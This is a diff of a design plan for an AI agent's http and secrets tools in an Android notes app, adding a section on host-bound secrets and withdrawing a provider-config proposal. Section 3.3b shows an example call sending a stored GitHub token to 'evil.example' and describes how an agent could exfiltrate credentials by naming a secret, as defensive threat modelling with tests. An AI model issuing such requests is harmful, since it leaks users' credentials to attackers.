@@ -136,6 +136,96 @@ written to agent/http/refs-a1b2c3.json
 **Rule 3 is the one that gets a test before the tool is reachable by a model**, because a token in a log
 cannot be recalled.
 
+### 3.3b The vault must bind a secret to a host — **and it has no door at all**
+
+This was missing from the first draft and the operator found it. Two separate defects, and the first is a
+security hole in §3.3 as written.
+
+#### The hole: `auth:` as specified is a token-exfiltration primitive
+
+§3.3's rule 2 says the agent may not write an `authorization` header — so it cannot type the token. **But it
+can still name it:**
+
+```
+http { "url": "https://evil.example/x", "auth": "github" }
+```
+
+The agent names the secret, the app resolves it through `Credentials.secret(name)`, and the value goes to a
+host the agent chose. **Rule 2 stops the agent typing the token; it does not stop the app sending it.**
+
+Today this is contained only because nothing can make such a request. `http` is exactly the thing that
+removes that containment.
+
+**The fix is the same one Part B just made in `GitService`:** the lookup takes the destination, so there is
+no way to ask for a secret without saying where it is going.
+
+```kotlin
+// Before — the signature cannot express the rule.
+fun secret(name: String): String?
+
+// After — the host is part of the question, not part of the name.
+fun secret(name: String, host: String): String?
+fun setSecret(name: String, value: String, host: String)
+```
+
+`secret("github", "evil.example")` returns null. **The check lives in the store, so no tool can forget it** —
+which is the same reasoning that moved `isGitHubHost` out of five call sites and into `credentials(remoteUrl,
+token)`.
+
+**Why the host is a field and not part of the key.** Making the URL the key — `secret("https://api.github.com")`
+— was the operator's suggestion and it is the wrong shape: changing a base URL would break the secret, one key
+could not serve several hosts, and the name a person reads in a list would be a URL. A field says *"this value
+may go to this host"* once, and the name stays a name.
+
+#### The bigger defect: **nothing in the app can create a secret**
+
+```
+$ grep -rn "setSecret(" app/src/main/java/com/example/notes/
+(no results)
+```
+
+`setSecret` is called **only by tests.** The vault is encrypted, tested, and reachable — and **no person can
+put anything into it.** `mcp` reads names that an article mentions, and there is no way to make one exist.
+
+That is the same defect class the morning audit found in `createdByOperator` and `CiSetup`: **a tested
+function nothing calls.** It makes `http`'s `auth:` untestable in practice, because there is no way for a
+person to supply the first secret.
+
+**So Part A needs a door:**
+
+1. **A settings screen listing secrets by name** — never values. Add, rename, delete. The value is typed once
+   and never shown again, which is what the store already enforces and what a person expects of a key.
+2. **The host is asked for when the secret is created**, because it is part of what the secret *is*.
+3. **A `secrets` tool that lists names only.** An agent that can see a name it needs is fine; one that can
+   enumerate every service a person uses is not, and one that can read values is the leak this whole section
+   exists to prevent.
+
+#### Tests — each with what fails if it is removed
+
+| # | Test | Fails if removed |
+|---|---|---|
+| 13 | `secret("github", "evil.example")` returns null | the agent exfiltrates the token by naming it |
+| 14 | `secret("github", "api.github.com")` returns the value | the host check is too strict and nothing works |
+| 15 | A subdomain is **not** matched by a bare domain (`api.github.com` vs `github.com`) | a look-alike host collects the key |
+| 16 | `http` with `auth:` for the wrong host refuses, naming the host | the refusal is silent and the model retries |
+| 17 | The `secrets` tool answers names and never a value | the tool is a value reader |
+| 18 | A secret set through the screen is readable by `http` | the door and the store disagree |
+
+Test 15 is the one that is easy to get wrong: `evil-github.com`.endsWith(`github.com`) is **false**, but
+`api.github.com`.endsWith(`github.com`) is **true** — so the rule must compare **whole labels**, not
+suffixes. `Secrets.hostOf` already answers the normalised host; the match is `host == allowed ||
+host.endsWith("." + allowed)`.
+
+#### Cost
+
+- `CredentialStore.secret(name, host)` / `setSecret(name, value, host)` — the signature change plus the
+  match, ~20 lines, and it touches `Mcp.kt:57` and every test fake.
+- The settings screen — the first real UI for secrets, so the largest piece.
+- The `secrets` tool — ~40 lines plus refusals.
+
+**This is inside Part A, before `http` is reachable**, not after: a tool whose auth cannot be created safely
+or used safely should not ship.
+
 ### 3.4 Tests — each with what fails if it is removed
 
 | # | Test | Fails if removed |
@@ -251,47 +341,45 @@ naming the host and the reason, and sends nothing.
 
 ---
 
-## 5. Part C — the provider config
+## 5. Part C — **WITHDRAWN: the provider config**
 
-`Door.kt` hardcodes one endpoint (`:845`) and pins three OpenRouter-only fields in the body (`:522`):
+This section proposed replacing `Door.ENDPOINT` and the three OpenRouter-only body fields with a config
+file, so any OpenAI-compatible endpoint could be used by editing one file.
 
-| Field | Who needs it |
-|---|---|
-| `provider.only` / `allow_fallbacks` | **OpenRouter only** |
-| `reasoning.exclude` | **OpenRouter only** |
-| `reasoning_effort` | OpenAI-compatible |
-| `model`, `messages`, `tools`, `stream` | **everyone** |
+**The operator withdrew it on 2026-11-06:** *"I don't think that we need to generalize it into openai config
+— as it is now is good enough. It is more important to make git, http and secrets work properly."*
 
-The response reader expects the OpenAI shape, which Groq, Together, DeepSeek-direct, Fireworks, vLLM and
-Ollama all speak. **So a config replaces exactly the provider-specific part:**
+**That is the right call, and the reasoning is worth keeping.**
 
-```json
-{
-  "endpoint": "https://api.deepseek.com/chat/completions",
-  "headers": { "Authorization": "Bearer {{key}}" },
-  "body": { "model": "{{model}}", "messages": "{{messages}}", "stream": true },
-  "reads": { "content": "choices[0].delta.content",
-             "tool_calls": "choices[0].delta.tool_calls" }
-}
-```
+### 5.1 Why it was a bad trade
 
-**What it buys:** any OpenAI-compatible endpoint, by editing one file. `provider.only` stops being Kotlin
-and becomes a template field — a **deletion**.
+The config's whole benefit was **reaching a second provider**, and the cost was real:
 
-**What it cannot do:** Anthropic's Messages API and Google's `generateContent` are structurally different —
-different message shapes, different tool-call format, different streaming events. Those need a **response
-parser**, not a template. The config covers the ~90% that copied OpenAI's shape, and the plan should say so
-rather than implying "any provider".
+- **A compile-time guarantee moved to runtime.** `Door.body` is pinned by a Kotlin test — its own comment
+  says *"the assembled body is the thing worth pinning rather than the call that wraps it."* A config file
+  cannot be pinned by the compiler, so every typo becomes a refusal that has to be built and tested, and a
+  broken config becomes a mystery 400 during a turn.
+- **It does not even reach the providers people would name.** Anthropic's Messages API and Google's
+  `generateContent` are structurally different — different message shapes, different tool-call format,
+  different streaming events. The config covers only the providers that already copied OpenAI's shape.
+- **The schema is the most load-bearing code in the app.** `Door.kt` is 894 lines of assembled body, stream
+  parsing, stall detection and failure classification. It is not the place to add a second input language.
 
-**The cost that is easy to miss:** `Door.body` is currently pinned by a Kotlin test — its own comment says
-*"the assembled body is the thing worth pinning rather than the call that wraps it."* Moving the body into
-a config moves that guarantee from **compile time to runtime**. Therefore: **the config is validated on
-load**, not on first use. A typo must be a refusal at the settings screen, not a mystery 400 mid-turn.
+### 5.2 What was actually needed instead
 
-**Tests:** a valid config assembles the pinned body; a missing `endpoint` is refused on load; a template
-naming an unknown variable is refused on load.
+Nothing. The three things the operator named — **git, http and secrets** — are the parts that are
+incomplete, and the provider config would have competed with them for the same attention while delivering a
+capability nobody had asked to use.
 
-**Cost:** ~200 lines plus tests.
+### 5.3 The finding that survives
+
+**`provider.only` and `allow_fallbacks` are OpenRouter-specific, and that is fine.** A model layer that
+speaks one provider's schema well is not a limitation to be engineered away; it is a decision, and the plan
+records it as one so it is not re-proposed.
+
+**If a second provider is ever genuinely needed**, the honest shape is a second `Door` implementation
+(`AnthropicDoor`) with its own body and its own stream reader — a real thing, written and tested as a real
+thing — not a template language that pretends two different protocols are one.
 
 ---
 
@@ -437,7 +525,6 @@ leaving the screen. Fails today.
 | **`fetchAllowed`** | Renamed `httpAllowed`. `http` must honour the same switch, and the settings label follows. |
 | **`Fetched.DIR`** | `http` gets its own folder. `Fetcher`, `Fetched.nameFor` and `LIMIT_BYTES` are all **kept**. |
 | **`gh`** | **Never built.** A typed method per endpoint is what made `CiSetup` take five compile rounds and what leaves four `REPOSITORY:` bindings to keep in step. `http` covers it, and a new GitHub endpoint needs no app change. |
-| **`provider.only` as Kotlin** | Becomes a template field in the provider config (§5) — a deletion, not an addition. |
 
 ---
 
@@ -568,7 +655,7 @@ fires after the phone has buffered two gigabytes is not a cap.
 | **2** | **B — `isGitHubHost` says why** (§4) | ~10 lines | **A live bug.** The guard is right; its silence is the bug. Widening it would leak the token. |
 | **3** | **A — `Fetcher.request` + `http`** (§3) | ~180 lines, 12 tests | The core. Test 4 (the vault never leaks) **before the tool is reachable by a model**. |
 | **4** | delete `fetch`, rename the switch (§8) | small | Follows immediately from 3. |
-| **5** | **C — provider config** (§5) | ~200 lines | Independent of 1–4; do it when a second provider is wanted. |
+| ~~5~~ | ~~**C — provider config**~~ (§5) | — | **Withdrawn by the operator.** The schema as it is is good enough; git, http and secrets matter more. |
 | **6** | **D — the `git` tool** (§6) | ~250 lines | Last, because it needs the refresh hook (1) to be visible and `checkout` makes staleness worst. |
 | **7** | one real call by hand against the GitHub API | — | Prove the shape end to end before trusting it. |
 
@@ -582,7 +669,8 @@ the plan starts with the two things that are bugs, not with the two things that 
 - **`http` is the first tool that can write to a foreign system on the agent's own initiative.** `push` was
   the only outward act before. The refusals in §3.3 are the guard, and test 4 is the one that must never be
   deleted.
-- **A provider config moves a compile-time guarantee to runtime** (§5). Validation on load is not optional.
+- **The vault cannot bind a secret to a host yet** (§3.3b). Until it does, `auth:` is a token-exfiltration
+  primitive: the agent names the secret, the app resolves it, and it goes to a host of the agent's choosing.
 - **`git checkout` on a phone is untested.** It can rewrite hundreds of files, and this app has no undo
   beyond history. It may need a confirmation rule that `revert` does not.
 - **The `git` tool's closed set will be argued with.** Every `op` not in the list becomes a request. The
